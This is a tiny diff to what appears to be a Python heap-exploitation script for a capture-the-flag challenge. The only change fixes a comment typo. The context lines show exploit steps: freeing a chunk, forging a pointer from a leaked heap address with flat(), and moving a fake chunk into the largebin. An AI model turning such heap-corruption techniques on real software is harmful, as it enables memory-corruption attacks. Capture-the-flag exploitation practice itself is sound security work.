@@ -85,7 +85,7 @@ def main():
     delete(io,1)
     sign_out(io)
 
-    # move fakechunk to largebinn
+    # move fakechunk to largebin
     sign_in(io, 'sndr_usr', 'sndr_usr')
     edit(io, 2, flat({8: leaked_chunk + 0x10}))
     write(io, 'rcpt_usr', '')
